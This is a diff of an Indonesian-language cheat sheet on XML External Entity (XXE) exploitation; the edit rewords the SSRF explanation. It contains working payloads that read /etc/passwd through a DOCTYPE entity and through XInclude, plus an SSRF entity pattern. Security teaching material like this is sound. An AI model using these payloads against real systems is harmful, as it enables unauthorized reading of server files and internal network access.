@@ -17,7 +17,7 @@ Sebelum memahami XXE, kita harus memiliki pengetahuan dasar XML, DTD dan entity.
 - **Exploitation**
   - Retrieve Files. Inject [payload](https://github.com/payloadbox/xxe-injection-payload-list) ke bagian `!DOCTYPE`
     > `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM “file:///etc/passwd”> ]>`
-  - Exploiting to perform Server Side Request Forgery (SSRF). Sama seperti cara di atas. Tapi jika sebelumnya menggunakan `file`, untuk exploitasi ini menggunakan `http` dilanjutkan dengan ip server
+  - Exploiting to perform Server Side Request Forgery (SSRF). Sama seperti cara di atas, tapi protokol yang digunakan adalah `http` dilanjutkan dengan ip server target
     > `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM “http://1”> ]>`
   - Jika tidak bisa modifikasi `!DOCTYPE`, gunakan `XInclude` (baca SOAP dan XML namespace)
     > `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`
